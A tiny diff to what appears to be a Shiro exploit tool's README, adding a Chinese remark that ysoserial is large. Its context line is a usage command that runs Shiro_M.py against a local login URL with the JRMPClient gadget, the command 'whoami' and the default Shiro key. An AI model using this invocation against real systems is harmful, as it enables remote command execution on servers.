@@ -10,3 +10,6 @@
 
 ​    python Shiro_M.py -u http://127.0.0.1:8080/login -t 3 -g "JRMPClient" -c "whoami" -k "kPH+bIxk5D2deZiIxcaaaA=="
 
+# 注：
+
+ysoserial比较大
